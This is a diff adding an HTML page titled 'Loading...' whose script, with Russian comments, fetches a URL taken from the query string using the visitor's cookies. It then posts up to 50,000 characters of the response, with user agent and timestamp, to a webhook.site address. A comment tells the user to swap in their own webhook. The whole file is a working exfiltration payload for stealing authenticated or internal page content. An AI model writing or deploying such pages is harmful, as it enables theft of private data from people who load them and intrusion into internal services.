@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading...</title>
+</head>
+<body>
+    <h1>Please wait...</h1>
+    <script>
+        // Получаем целевой URL из параметра
+        const targetUrl = new URLSearchParams(window.location.search).get('url') || 'http://127.0.0.1';
+        
+        // Замени на свой webhook URL с webhook.site
+        const webhookUrl = 'https://webhook.site/eac24f4c-67b5-4837-bcc9-2740091b6393';
+        
+        fetch(targetUrl, {
+            method: 'GET',
+            credentials: 'include'
+        })
+        .then(response => response.text())
+        .then(html => {
+            // Отправляем данные на webhook
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    target_url: targetUrl,
+                    html_content: html.substring(0, 50000), // ограничиваем размер
+                    timestamp: new Date().toISOString(),
+                    user_agent: navigator.userAgent
+                })
+            })
+            .then(() => {
+                document.body.innerHTML = '<h1>Data sent successfully!</h1>';
+            })
+            .catch(err => {
+                document.body.innerHTML = '<h1>Error sending data</h1><p>' + err + '</p>';
+            });
+        })
+        .catch(err => {
+            document.body.innerHTML = '<h1>Error fetching target</h1><p>' + err + '</p>';
+            // Даже если не получилось получить HTML, отправляем ошибку
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    error: err.toString(),
+                    target_url: targetUrl,
+                    timestamp: new Date().toISOString()
+                })
+            });
+        });
+    </script>
+</body>
+</html>
